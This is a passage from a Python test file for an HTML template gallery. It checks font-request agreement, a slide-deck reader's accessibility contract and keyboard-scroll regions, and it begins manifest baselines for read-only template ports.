        self.write_kit(
            body=FIXTURE_AGREEING_KIT.replace(
                FIXTURE_CONTROL_RULE, f"[data-rc]::after {{\n  content: '.{FIXTURE_CONTROL_CLASS}';\n}}"
            )
        )

        self.assertPairReports(check_k1(self.gallery), FIXTURE_CONTROL_CLASS)

    def test_k1_reads_a_class_set_as_markup_inside_a_script_string(self) -> None:
        """The mark's class: script content is raw text, so no parser sees this one."""
        self.write_kit(body=_without(FIXTURE_AGREEING_KIT, FIXTURE_MARK_RULE))

        self.assertPairReports(check_k1(self.gallery), FIXTURE_MARK_CLASS)

    def test_k1_rejects_a_class_bound_above_the_start_marker(self) -> None:
        binding = f"  var CONTROL_CLASS = '{FIXTURE_CONTROL_CLASS}';\n"
        self.write_head(
            body=FIXTURE_AGREEING_HEAD.replace(FIXTURE_CLASS_ASSIGNMENT, "    control.className = CONTROL_CLASS;\n"),
            above=f"<script>\n{binding}</script>\n",
        )

        self.assertPairReports(check_k1(self.gallery), "CONTROL_CLASS")

    def test_k1_accepts_a_class_bound_inside_the_region(self) -> None:
        self.write_head(
            body=FIXTURE_AGREEING_HEAD.replace(
                FIXTURE_CLASS_ASSIGNMENT,
                f"    var CONTROL_CLASS = '{FIXTURE_CONTROL_CLASS}';\n    control.className = CONTROL_CLASS;\n",
            )
        )

        self.assertEqual(check_k1(self.gallery), [])

    # -- K2: the families one file requests and the other leads its stacks with --

    def test_k2_accepts_a_request_naming_every_led_family(self) -> None:
        self.assertEqual(check_k2(self.gallery), [])

    def test_k2_rejects_a_family_renamed_in_the_kit_only(self) -> None:
        self.write_kit(body=FIXTURE_AGREEING_KIT.replace(FIXTURE_BODY_FAMILY, FIXTURE_ADDED_FAMILY))

        self.assertPairReports(check_k2(self.gallery), FIXTURE_ADDED_FAMILY)
        self.assertPairReports(check_k2(self.gallery), FIXTURE_BODY_FAMILY)

    def test_k2_rejects_a_family_renamed_in_the_request_only(self) -> None:
        self.write_head(
            body=FIXTURE_AGREEING_HEAD.replace(FIXTURE_BODY_FAMILY.replace(" ", "+"), "Fixture+Serif")
        )

        self.assertPairReports(check_k2(self.gallery), FIXTURE_BODY_FAMILY)

    def test_k2_rejects_a_stack_added_without_the_request(self) -> None:
        """The stated failure mode: every artifact falls through to the fallback."""
        self.write_kit(
            body=FIXTURE_AGREEING_KIT.replace(
                FIXTURE_BODY_STACK,
                FIXTURE_BODY_STACK + f"  --rc-font-serif: '{FIXTURE_ADDED_FAMILY}', Georgia, serif;\n",
            )
        )

        self.assertPairReports(check_k2(self.gallery), FIXTURE_ADDED_FAMILY)

    def test_k2_rejects_a_request_for_a_family_no_stack_leads_with(self) -> None:
        self.write_head(
            body=FIXTURE_AGREEING_HEAD.replace(
                "&amp;display=swap", "&amp;family=Fixture+Serif:wght@400&amp;display=swap"
            )
        )

        self.assertPairReports(check_k2(self.gallery), FIXTURE_ADDED_FAMILY)

    def test_k2_rejects_a_request_the_head_file_does_not_carry_at_all(self) -> None:
        self.write_head(body=_without(FIXTURE_AGREEING_HEAD, f'<link rel="stylesheet" href="{FIXTURE_FONT_REQUEST}">\n'))

        self.assertPairReports(check_k2(self.gallery), FIXTURE_DISPLAY_FAMILY)

    def test_k2_ignores_the_axis_values_a_family_is_requested_with(self) -> None:
        """Families only. An unrequested weight is synthesised; an unrequested face is not."""
        self.write_head(body=FIXTURE_AGREEING_HEAD.replace(":wght@400;700", "").replace(":wght@400;500", ""))

        self.assertEqual(check_k2(self.gallery), [])

    def test_k2_ignores_a_stack_that_asks_the_provider_for_nothing(self) -> None:
        """A stack led by a generic family names no face the provider has to serve."""
        self.write_kit(
            body=FIXTURE_AGREEING_KIT.replace(
                FIXTURE_BODY_STACK, FIXTURE_BODY_STACK + "  --rc-font-native: system-ui, sans-serif;\n"
            )
        )

        self.assertEqual(check_k2(self.gallery), [])

    def test_k2_ignores_a_declaration_that_is_not_a_typeface_stack(self) -> None:
        self.write_kit(
            body=FIXTURE_AGREEING_KIT.replace(
                FIXTURE_BODY_STACK, FIXTURE_BODY_STACK + "  --rc-font-weight-strong: 600;\n"
            )
        )

        self.assertEqual(check_k2(self.gallery), [])


# ---------------------------------------------------------------------------
# Group Q - ART-005 slide-deck reader contract (FR-003, FR-005, FR-006,
# FR-013, FR-014, FR-022)
# ---------------------------------------------------------------------------

SLIDE_DECK_ID = "slide-deck"
SLIDE_DECK_SOURCE_FILE = "09-slide-deck.html"
SLIDE_DECK_LABEL = f"{TEMPLATES_DIR}/{SLIDE_DECK_ID}.html"
_SLIDE_POSITION_RE = re.compile(r"\bSlide\s+\d+\s+of\s+\d+\b", re.IGNORECASE)
_ART005_HORIZONTAL_OVERFLOW_RE = re.compile(r"overflow-x\s*:\s*(?:auto|scroll)\b", re.IGNORECASE)


def check_q1(gallery_root: Path) -> list[str]:
    """Q1 - the slide-deck row, reader markup, and interaction contract agree."""
    entries = _entries(gallery_root)
    matches = [
        entry
        for entry in entries or []
        if isinstance(entry, dict) and entry.get("id") == SLIDE_DECK_ID
    ]
    if len(matches) != 1:
        return [f"{MANIFEST_FILE}: expected one '{SLIDE_DECK_ID}' entry, found {len(matches)}"]

    entry = matches[0]
    source = entry.get("source")
    failures: list[str] = []
    if entry.get("status") != SHIPPED:
        failures.append(f"{MANIFEST_FILE}: '{SLIDE_DECK_ID}' must be shipped, found {entry.get('status')!r}")
    if entry.get("exports") != []:
        failures.append(f"{MANIFEST_FILE}: '{SLIDE_DECK_ID}' is a reader and must keep exports: []")
    if not isinstance(source, dict) or source.get("origin") != UPSTREAM or source.get("file") != SLIDE_DECK_SOURCE_FILE:
        failures.append(
            f"{MANIFEST_FILE}: '{SLIDE_DECK_ID}' must remain sourced from {SLIDE_DECK_SOURCE_FILE}"
        )

    artifact = _artifact_path(gallery_root, SLIDE_DECK_ID)
    if artifact is None or not artifact.is_file():
        failures.append(f"{SLIDE_DECK_LABEL}: missing reader artifact")
        return failures

    text = _document_text(artifact)
    lowered = text.casefold()
    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]

    for block in CANONICAL_FILES:
        if not _embeds(text, block):
            failures.append(f"{SLIDE_DECK_LABEL}: missing canonical {block} block")
            continue
        expected = _canonical_region(gallery_root, block)
        if expected is None or _region(text, block) != expected:
            failures.append(f"{SLIDE_DECK_LABEL}: canonical {block} bytes drifted")

    header = _attribution_header(text)
    if header is None:
        failures.append(f"{SLIDE_DECK_LABEL}: missing upstream attribution header")
    else:
        failures.extend(
            f"{SLIDE_DECK_LABEL}: attribution is missing {element.name}"
            for element in ATTRIBUTION_ELEMENTS
            if not _carried(header, element)
        )
        if _labelled_value(header, UPSTREAM_FILE_LABEL) != SLIDE_DECK_SOURCE_FILE:
            failures.append(f"{SLIDE_DECK_LABEL}: attribution must name {SLIDE_DECK_SOURCE_FILE}")

    for token in ("copy as", "navigator.clipboard", "execcommand(", "download="):
        if token in lowered:
            failures.append(f"{SLIDE_DECK_LABEL}: reader exposes export token {token!r}")

    named_navigation = [
        attrs
        for element, attrs in zip(elements, attributes)
        if (element.tag == "nav" or attrs.get("role") == "navigation")
        and (attrs.get("aria-label", "").strip() or attrs.get("aria-labelledby", "").strip())
    ]
    if not named_navigation:
        failures.append(f"{SLIDE_DECK_LABEL}: slide navigation group has no programmatic name")

    button_names = {
        attrs.get("aria-label", "").strip().casefold()
        for element, attrs in zip(elements, attributes)
        if element.tag == "button"
    }
    if not any("previous" in name for name in button_names) or not any("next" in name for name in button_names):
        failures.append(f"{SLIDE_DECK_LABEL}: missing named previous/next slide controls")
    if not _SLIDE_POSITION_RE.search(text):
        failures.append(f"{SLIDE_DECK_LABEL}: missing visible current-position text such as Slide 1 of 3")

    slides = [
        attrs
        for attrs in attributes
        if "slide" in attrs.get("class", "").split()
    ]
    if len(slides) < 2:
        failures.append(f"{SLIDE_DECK_LABEL}: expected at least two slide elements")
    if not any("hidden" in attrs for attrs in slides):
        failures.append(f"{SLIDE_DECK_LABEL}: no inactive slide starts hidden")
    if ".hidden =" not in text or ".inert =" not in text:
        failures.append(f"{SLIDE_DECK_LABEL}: slide changes do not update hidden and inert together")
    if "focusSlide: false" not in text or "focusSlide: true" not in text or ".focus(" not in text:
        failures.append(f"{SLIDE_DECK_LABEL}: control and non-control focus paths are not explicit")
    if "setInterval(" in text:
        failures.append(f"{SLIDE_DECK_LABEL}: automatic slide rotation is prohibited")

    if not re.search(r"<meta\s+[^>]*name=[\"']viewport[\"']", text, re.IGNORECASE):
        failures.append(f"{SLIDE_DECK_LABEL}: missing mobile viewport metadata")
    widths = [
        int(value)
        for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)
    ]
    if not any(width >= 360 for width in widths):
        failures.append(f"{SLIDE_DECK_LABEL}: no responsive rule covers the 360 CSS px review width")
    if "prefers-reduced-motion" not in text:
        failures.append(f"{SLIDE_DECK_LABEL}: missing reduced-motion handling")

    for element, attrs in zip(elements, attributes):
        value = attrs.get("tabindex", "")
        if value.lstrip("-").isdigit() and int(value) > 0:
            failures.append(f"{SLIDE_DECK_LABEL}: <{element.tag}> uses positive tabindex={value!r}")

    for selector, declarations in _RULE_RE.findall(text):
        if not _ART005_HORIZONTAL_OVERFLOW_RE.search(declarations):
            continue
        classes = re.findall(r"\.([A-Za-z_-][\w-]*)", selector)
        identifiers = re.findall(r"#([A-Za-z_-][\w-]*)", selector)
        matched = [
            attrs
            for attrs in attributes
            if attrs.get("id") in identifiers
            or any(name in attrs.get("class", "").split() for name in classes)
        ]
        if not matched:
            failures.append(f"{SLIDE_DECK_LABEL}: horizontal scroll rule has no bound actual element")
            continue
        for attrs in matched:
            name = attrs.get("aria-label", "").strip() or attrs.get("aria-labelledby", "").strip()
            if attrs.get("tabindex") != "0" or attrs.get("role") != "group" or not name:
                failures.append(
                    f"{SLIDE_DECK_LABEL}: actual horizontal scroll element must have tabindex=0, "
                    "role=group, and a programmatic name"
                )
    return failures


# Group L — horizontal keyboard-scroll regions (FR-022, FR-023)
# ---------------------------------------------------------------------------

KEYBOARD_SCROLL_ATTRIBUTE = "data-rc-keyboard-scroll"
KEYBOARD_SCROLL_VALUE = "horizontal"
KEYBOARD_SCROLL_TARGET_IDS: frozenset[str] = frozenset(
    {
        "animation-prototype",
        "code-approaches",
        "component-variants",
        "design-system",
        "implementation-plan",
        "interaction-prototype",
        "module-map",
        "svg-illustrations",
        "visual-designs",
    }
)
PREDECLARATION_KEYBOARD_SCROLL_ROUTE_IDS: frozenset[str] = frozenset(
    {"annotated-diff", "flowchart"}
)
REPAIRED_KEYBOARD_SCROLL_REGION_MINIMUMS: dict[str, int] = {
    "code-approaches": 3,
    "implementation-plan": 2,
    "module-map": 6,
}
REPAIRED_KEYBOARD_SCROLL_TARGET_IDS: frozenset[str] = frozenset(
    REPAIRED_KEYBOARD_SCROLL_REGION_MINIMUMS
)
READ_ONLY_KEYBOARD_SCROLL_REGION_MINIMUMS: dict[str, int] = {
    "design-system": 1,
    "animation-prototype": 1,
    "svg-illustrations": 1,
}
DECISION_KEYBOARD_SCROLL_REGION_MINIMUMS: dict[str, int] = {
    "component-variants": 1,
}

# This is deliberately a bounded raw-source check rather than a CSS parser. It
# catches the two values the gallery uses to opt into horizontal scrolling and
# does not try to map selectors back to elements. The declaration in markup is
# the source of truth for that relationship.
_HORIZONTAL_OVERFLOW_RE = re.compile(r"(?i)\boverflow-x\s*:\s*(?:auto|scroll)\b")
_GENERIC_SCROLL_LABELS: frozenset[str] = frozenset(
    {
        "horizontal scroll area",
        "horizontal scroll container",
        "horizontal scroll region",
        "scroll area",
        "scroll container",
        "scroll region",
        "scrollable area",
        "scrollable container",
        "scrollable region",
    }
)


class _KeyboardScrollDocument(NamedTuple):
    """One manifest-shipped artifact and its parsed element positions."""

    artifact_id: str
    label: str
    text: str
    elements: tuple[_Element, ...]


class _KeyboardScrollRegion(NamedTuple):
    """One declared horizontal region, in declaration order within its artifact."""

    artifact_id: str
    source_order: int
    accessible_name: str
    element: _Element


def _attribute_values(element: _Element, name: str) -> list[str]:
    return [value for attribute, value in element.attributes if attribute == name]


def _declares_horizontal_keyboard_scroll(element: _Element) -> bool:
    return _attribute_values(element, KEYBOARD_SCROLL_ATTRIBUTE) == [KEYBOARD_SCROLL_VALUE]


def _specific_scroll_label(value: str) -> bool:
    normalized = " ".join(value.split()).casefold()
    return bool(normalized) and normalized not in _GENERIC_SCROLL_LABELS


def _shipped_keyboard_scroll_documents(gallery_root: Path) -> list[_KeyboardScrollDocument]:
    """Manifest-shipped artifacts, parsed once each in manifest order."""
    documents: list[_KeyboardScrollDocument] = []
    resolved, _ = _derived_artifacts(gallery_root, SHIPPED)
    for _, identifier, path in resolved:
        if not path.is_file():
            continue  # D1 owns a shipped entry whose derived artifact is absent
        text = _document_text(path)
        documents.append(
            _KeyboardScrollDocument(
                artifact_id=identifier,
                label=_artifact_label(identifier),
                text=text,
                elements=tuple(_elements(text)),
            )
        )
    return documents


def _shipped_keyboard_scroll_target_ids(gallery_root: Path) -> set[str]:
    """Target IDs marked shipped, held independently from the document sweep."""
    entries = _entries(gallery_root)
    if entries is None:
        return set()
    targets: set[str] = set()
    for entry in entries:
        if not isinstance(entry, dict) or entry.get("status") != SHIPPED:
            continue
        identifier = entry.get("id")
        if isinstance(identifier, str) and identifier in KEYBOARD_SCROLL_TARGET_IDS:
            targets.add(identifier)
    return targets


def _keyboard_scroll_regions(gallery_root: Path) -> list[_KeyboardScrollRegion]:
    """Declared regions with artifact ID, declaration order, and accessible name."""
    regions: list[_KeyboardScrollRegion] = []
    for document in _shipped_keyboard_scroll_documents(gallery_root):
        source_order = 0
        for element in document.elements:
            if not _declares_horizontal_keyboard_scroll(element):
                continue
            source_order += 1
            labels = _attribute_values(element, "aria-label")
            accessible_name = labels[0].strip() if len(labels) == 1 else ""
            regions.append(
                _KeyboardScrollRegion(
                    artifact_id=document.artifact_id,
                    source_order=source_order,
                    accessible_name=accessible_name,
                    element=element,
                )
            )
    return regions


def _keyboard_scroll_region_label(region: _KeyboardScrollRegion) -> str:
    return (
        f"{_artifact_label(region.artifact_id)}: declared keyboard-scroll region "
        f"source-order {region.source_order}"
    )


def _document_has_keyboard_scroll_route(document: _KeyboardScrollDocument) -> bool:
    """Whether a document declares a route or carries the complete legacy route.

    ``annotated-diff`` and ``flowchart`` shipped the complete keyboard route
    before the explicit data declaration existed. Treating their focusable,
    grouped, specifically named regions as routes keeps this guard focused on
    the five still-unreachable source declarations while every new or repaired
    region adopts the explicit marker.
    """
    if any(_declares_horizontal_keyboard_scroll(element) for element in document.elements):
        return True
    if document.artifact_id not in PREDECLARATION_KEYBOARD_SCROLL_ROUTE_IDS:
        return False
    for element in document.elements:
        if _attribute_values(element, "tabindex") != ["0"]:
            continue
        if _attribute_values(element, "role") != ["group"]:
            continue
        labels = _attribute_values(element, "aria-label")
        if len(labels) == 1 and _specific_scroll_label(labels[0]):
            return True
    return False


def check_l1(gallery_root: Path) -> list[str]:
    """L1 — every declared horizontal region has exactly ``tabindex=\"0\"``."""
    return [
        f"{_keyboard_scroll_region_label(region)}: expected exactly tabindex=\"0\", "
        f"found {_attribute_values(region.element, 'tabindex')!r}"
        for region in _keyboard_scroll_regions(gallery_root)
        if _attribute_values(region.element, "tabindex") != ["0"]
    ]


def check_l2(gallery_root: Path) -> list[str]:
    """L2 — every declared horizontal region has exactly ``role=\"group\"``."""
    return [
        f"{_keyboard_scroll_region_label(region)}: expected exactly role=\"group\", "
        f"found {_attribute_values(region.element, 'role')!r}"
        for region in _keyboard_scroll_regions(gallery_root)
        if _attribute_values(region.element, "role") != ["group"]
    ]


def check_l3(gallery_root: Path) -> list[str]:
    """L3 — every declared horizontal region has one specific ``aria-label``."""
    failures: list[str] = []
    for region in _keyboard_scroll_regions(gallery_root):
        labels = _attribute_values(region.element, "aria-label")
        prefix = _keyboard_scroll_region_label(region)
        if len(labels) != 1:
            failures.append(f"{prefix}: expected exactly one specific aria-label, found {labels!r}")
        elif not labels[0].strip():
            failures.append(f"{prefix}: aria-label is empty after trimming")
        elif not _specific_scroll_label(labels[0]):
            failures.append(f"{prefix}: aria-label {labels[0].strip()!r} is generic")
    return failures


def check_l4(gallery_root: Path) -> list[str]:
    """L4 — no manifest-shipped artifact uses a positive ``tabindex``."""
    failures: list[str] = []
    for document in _shipped_keyboard_scroll_documents(gallery_root):
        for element in document.elements:
            for value in _attribute_values(element, "tabindex"):
                try:
                    positive = int(value.strip()) > 0
                except ValueError:
                    positive = False
                if positive:
                    failures.append(
                        f"{document.label}: element source-order {element.order + 1}: "
                        f"positive tabindex {value!r} replaces the document's sequential focus order"
                    )
    return failures


def check_l5(gallery_root: Path) -> list[str]:
    """L5 — raw horizontal-overflow declarations have a keyboard route."""
    failures: list[str] = []
    for document in _shipped_keyboard_scroll_documents(gallery_root):
        matches = list(_HORIZONTAL_OVERFLOW_RE.finditer(document.text))
        if not matches or _document_has_keyboard_scroll_route(document):
            continue
        for match in matches:
            line = document.text.count("\n", 0, match.start()) + 1
            declaration = " ".join(match.group(0).split())
            failures.append(
                f"{document.label}: line {line}: horizontal overflow styling {declaration!r} has no "
                f"{KEYBOARD_SCROLL_ATTRIBUTE}=\"{KEYBOARD_SCROLL_VALUE}\" declaration"
            )
    return failures


GROUP_L_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("L1", check_l1),
    ("L2", check_l2),
    ("L3", check_l3),
    ("L4", check_l4),
    ("L5", check_l5),
)


class KeyboardScrollGuardTests(unittest.TestCase):
    """Group L against the shipped gallery."""

    def test_group_l_passes_against_the_shipped_gallery(self) -> None:
        self.maxDiff = None
        for name, check in GROUP_L_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_keyboard_scroll_target_artifacts_are_swept_when_shipped(self) -> None:
        shipped_targets = _shipped_keyboard_scroll_target_ids(GALLERY_ROOT)
        swept = {document.artifact_id for document in _shipped_keyboard_scroll_documents(GALLERY_ROOT)}

        self.assertEqual(
            shipped_targets,
            swept.intersection(KEYBOARD_SCROLL_TARGET_IDS),
            "a shipped keyboard-scroll target artifact is outside the collector sweep",
        )

    def test_repaired_keyboard_scroll_regions_are_declared_for_manual_review(self) -> None:
        regions = [
            region
            for region in _keyboard_scroll_regions(GALLERY_ROOT)
            if region.artifact_id in REPAIRED_KEYBOARD_SCROLL_TARGET_IDS
        ]

        for artifact_id, minimum in REPAIRED_KEYBOARD_SCROLL_REGION_MINIMUMS.items():
            with self.subTest(msg=artifact_id):
                declared = sum(region.artifact_id == artifact_id for region in regions)
                self.assertGreaterEqual(
                    declared,
                    minimum,
                    f"{artifact_id}: expected at least {minimum} declared region(s) for keyboard focus-order review",
                )

    def test_read_only_keyboard_scroll_regions_are_declared_for_manual_review(self) -> None:
        regions = _keyboard_scroll_regions(GALLERY_ROOT)

        for artifact_id, minimum in READ_ONLY_KEYBOARD_SCROLL_REGION_MINIMUMS.items():
            with self.subTest(msg=artifact_id):
                declared = sum(region.artifact_id == artifact_id for region in regions)
                self.assertGreaterEqual(
                    declared,
                    minimum,
                    f"{artifact_id}: expected at least {minimum} intentional horizontal-scroll region(s); "
                    "the read-only port is not shipped or its keyboard-scroll declaration is missing",
                )

    def test_decision_keyboard_scroll_regions_are_declared_for_manual_review(self) -> None:
        regions = _keyboard_scroll_regions(GALLERY_ROOT)

        for artifact_id, minimum in DECISION_KEYBOARD_SCROLL_REGION_MINIMUMS.items():
            with self.subTest(msg=artifact_id):
                declared = sum(region.artifact_id == artifact_id for region in regions)
                self.assertGreaterEqual(
                    declared,
                    minimum,
                    f"{artifact_id}: expected at least {minimum} intentional horizontal-scroll region(s); "
                    "the decision port is not shipped or its keyboard-scroll declaration is missing",
                )


class KeyboardScrollGuardFixtureTests(GalleryFixtureCase):
    """Group L against synthetic shipped artifacts built in a temporary directory."""

    def write_scroll_artifact(
        self,
        body: str,
        *,
        identifier: str = "keyboard-scroll-sample",
        status: str = SHIPPED,
    ) -> None:
        self.write(MANIFEST_FILE, json.dumps({"templates": [{"id": identifier, "status": status}]}, indent=2))
        self.write(
            f"{TEMPLATES_DIR}/{identifier}.html",
            "<!doctype html>\n"
            "<html lang=\"en\">\n"
            "<head><title>Keyboard Scroll Fixture</title></head>\n"
            f"<body>\n{body}\n</body>\n"
            "</html>\n",
        )

    def assertKeyboardScrollReports(self, failures: list[str], *fragments: str) -> None:
        self.assertReports(failures, "keyboard-scroll-sample", *fragments)

    def test_accepts_a_declared_scroll_region_with_keyboard_route(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="Keyboard scroll fixture comparison table"></section>'
        )

        self.assertEqual([failure for _, check in GROUP_L_CHECKS for failure in check(self.gallery)], [])

    def test_collects_declared_regions_for_manual_focus_order_review(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="First comparison strip"></section>\n'
            '<div><section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="Second comparison strip"></section></div>'
        )

        regions = _keyboard_scroll_regions(self.gallery)

        self.assertEqual(
            [
                ("keyboard-scroll-sample", 1, "First comparison strip"),
                ("keyboard-scroll-sample", 2, "Second comparison strip"),
            ],
            [(region.artifact_id, region.source_order, region.accessible_name) for region in regions],
        )

    def test_rejects_declared_scroll_region_without_keyboard_route(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" role="group" '
            'aria-label="Keyboard scroll fixture comparison table"></section>'
        )

        self.assertKeyboardScrollReports(check_l1(self.gallery), "source-order 1", 'tabindex="0"')

    def test_rejects_declared_scroll_region_without_group_role(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" '
            'aria-label="Keyboard scroll fixture comparison table"></section>'
        )

        self.assertKeyboardScrollReports(check_l2(self.gallery), "source-order 1", 'role="group"')

    def test_rejects_declared_scroll_region_without_accessible_name(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group"></section>'
        )

        self.assertKeyboardScrollReports(check_l3(self.gallery), "source-order 1", "aria-label")

    def test_rejects_declared_scroll_region_with_empty_accessible_name(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="   "></section>'
        )

        self.assertKeyboardScrollReports(check_l3(self.gallery), "source-order 1", "aria-label")

    def test_rejects_declared_scroll_region_with_generic_accessible_name(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="scroll area"></section>'
        )

        self.assertKeyboardScrollReports(check_l3(self.gallery), "source-order 1", "scroll area", "generic")

    def test_rejects_positive_tabindex_anywhere_in_a_shipped_artifact(self) -> None:
        self.write_scroll_artifact(
            '<section data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="Keyboard scroll fixture comparison table"></section>\n'
            '<button tabindex="2">Jump ahead</button>'
        )

        self.assertKeyboardScrollReports(check_l4(self.gallery), "tabindex", "2")

    def test_rejects_horizontal_overflow_styling_without_a_declared_region(self) -> None:
        self.write_scroll_artifact(
            "<style>.wide-region { overflow-x: auto; }</style>\n"
            '<div class="wide-region"><table><tr><td>wide</td></tr></table></div>'
        )

        self.assertKeyboardScrollReports(
            check_l5(self.gallery),
            "overflow-x: auto",
            'data-rc-keyboard-scroll="horizontal"',
        )

    def test_accepts_horizontal_overflow_styling_when_a_region_is_declared(self) -> None:
        self.write_scroll_artifact(
            "<style>.wide-region { overflow-x: auto; }</style>\n"
            '<section class="wide-region" data-rc-keyboard-scroll="horizontal" tabindex="0" role="group" '
            'aria-label="Keyboard scroll fixture comparison table"></section>'
        )

        self.assertEqual(check_l5(self.gallery), [])


# ---------------------------------------------------------------------------
# Group M — read-only gallery ports
# ---------------------------------------------------------------------------

PINNED_UPSTREAM_COMMIT = "58c305be97f47b26b678f2c07dec01d4242268ec"
PORT_DERIVATIVE_NOTICE = (
    "yes — re-skinned with Racecraft brand tokens; not the upstream original"
)
READ_ONLY_PORT_MANIFEST_BASELINE: dict[str, dict[str, object]] = {
    "design-system": {
        "id": "design-system",
        "category": "design",
        "title": "Design System",
        "when_to_use": (
            "Document the tokens, type scale, and components a surface is built from, each rendered as "
            "itself. Reach for it when contributors need one place to check what a color or a spacing "
            "step is called."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "05-design-system.html"},
        "status": PLANNED,
        "exports": [],
    },
    "animation-prototype": {
        "id": "animation-prototype",
        "category": "prototyping",
        "title": "Animation Prototype",
        "when_to_use": (
            "Play a motion design at real speed so timing and easing can be judged rather than described. "
            "Reach for it when a still image cannot settle the question."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "07-prototype-animation.html"},
        "status": PLANNED,
        "exports": [],
    },
    "interaction-prototype": {
        "id": "interaction-prototype",
        "category": "prototyping",
        "title": "Interaction Prototype",
        "when_to_use": (
            "Make a flow clickable so a reader can walk it themselves. Reach for it when the open question "
            "is how a sequence of steps behaves, not how one screen looks."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "08-prototype-interaction.html"},
        "status": PLANNED,
        "exports": [],
    },
    "svg-illustrations": {
        "id": "svg-illustrations",
        "category": "diagrams",
        "title": "SVG Illustrations",
        "when_to_use": (
            "Draw a diagram or illustration as vector markup that stays sharp at any size and loads no image "
            "file. Reach for it when the picture carries the explanation."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "10-svg-illustrations.html"},
        "status": PLANNED,
        "exports": [],
    },
}
DESIGN_SYSTEM_SECTION_IDS: tuple[str, ...] = ("color", "typography", "spacing", "shape", "components")
ANIMATION_EASING_CHOICES: tuple[str, ...] = (
    "linear",
    "cubic-bezier(0.16, 1, 0.3, 1)",
    "cubic-bezier(0.34, 1.56, 0.64, 1)",
)
ANIMATION_KEYFRAME_PHASES: tuple[tuple[str, str], ...] = (
    ("Fill", "0ms"), ("Check", "80ms"), ("Strike", "120ms"), ("Confetti", "200ms"), ("Collapse", "600ms"),
)
INTERACTION_MINIMUM_RETAINED_VIEWS = 3
INTERACTION_NOTE_CONCEPTS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("nearest-gap drop indicator", ("drop indicator", "nearest gap")), ("in-place dragged row", ("dragged row", "stays in place")),
    ("whole-row grip affordance", ("grip dots", "whole row")), ("omitted edge motion", ("auto-scroll", "drop animation")),
)
INTERACTION_QUESTION_CONCEPTS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("pinned Trash and Archive", ("trash", "archive", "pinned", "reordering")), ("slide versus instant snap", ("slide", "instant snap")),
    ("Alt+Arrow keyboard path", ("keyboard", "alt", "arrow")),
)
SVG_ILLUSTRATION_IDS: tuple[str, ...] = ("ill-queue", "ill-retry", "ill-fanout")
SVG_PALETTE_CONCEPTS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("non-color stroke emphasis", ("stroke", "outline", "without color")), ("written state labels", ("labels", "text")),
    ("monochrome pattern meaning", ("pattern", "monochrome")),
)
INTERACTION_BEHAVIOR_TOKENS: tuple[str, ...] = (
    ".item.dragging", ".indicator.on",
    "addEventListener('dragstart'", "addEventListener('dragover'", "addEventListener('drop'", "addEventListener('dragend'",
    "classList.add('dragging')", "classList.remove('dragging')", "classList.add('on')", "classList.remove('on')",
    "initialOrder", "reset.addEventListener('click'", "insertBefore",
)
_EXPORT_AFFORDANCE_RE = re.compile(r"(?i)\b(?:copy|download|export|markdown|prompt)\b")
_CONTROL_TAGS: frozenset[str] = frozenset(
    {"a", "area", "button", "input", "select", "textarea"}
)
_CONTROL_ROLES: frozenset[str] = frozenset(
    {"button", "link", "menuitem", "menuitemcheckbox", "menuitemradio"}
)


class _ControlCollector(HTMLParser):
    """Interactive elements with their attributes and nested visible text."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.controls: list[dict[str, object]] = []
        self._stack: list[tuple[str, int | None]] = []
        self._active: list[int] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = tuple((name.lower(), value or "") for name, value in attrs)
        roles = [value.casefold() for name, value in values if name == "role"]
        control = tag in _CONTROL_TAGS or any(role in _CONTROL_ROLES for role in roles)
        index: int | None = None
        if control:
            index = len(self.controls)
            self.controls.append({"tag": tag, "attributes": values, "text": []})
            self._active.append(index)
        if tag not in VOID_ELEMENTS:
            self._stack.append((tag, index))

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)
        if self._stack and self._stack[-1][0] == tag:
            self.handle_endtag(tag)

    def handle_endtag(self, tag: str) -> None:
        while self._stack:
            opened, index = self._stack.pop()
            if index is not None and index in self._active:
                self._active.remove(index)
            if opened == tag:
                break

    def handle_data(self, data: str) -> None:
        for index in self._active:
            text = self.controls[index]["text"]
            if isinstance(text, list):
                text.append(data)


def _interactive_controls(text: str) -> list[dict[str, object]]:
    controls: list[dict[str, object]] = []
    for markup in (text, *_script_markup_literals(text)):
        collector = _ControlCollector()
        collector.feed(markup)
        collector.close()
        controls.extend(collector.controls)
    return controls


def _port_path(gallery_root: Path, artifact_id: str) -> Path:
    return gallery_root / TEMPLATES_DIR / f"{artifact_id}.html"


def _port_texts(
    gallery_root: Path,
    baselines: dict[str, dict[str, object]],
) -> list[tuple[str, Path, str]]:
    documents: list[tuple[str, Path, str]] = []
    for artifact_id in baselines:
